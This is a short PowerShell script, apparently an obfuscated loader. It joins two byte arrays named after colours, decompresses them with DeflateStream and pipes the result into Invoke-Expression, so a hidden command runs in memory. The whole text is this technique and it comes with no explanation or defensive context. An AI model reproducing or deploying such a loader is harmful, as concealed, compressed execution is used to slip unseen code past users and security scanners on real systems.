[Byte[]]$red =  [Byte[]](5,192,161,9,0,0,0,2,193,89)
[Byte[]]$blue =  [Byte[]](229,170,251,231,199,46)
$mixcolours=$red+$blue
$output=New-Object IO.MemoryStream(,$mixcolours)
IeX(New-Object IO.StreamReader(New-Object IO.Compression.DeflateStream($output,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()

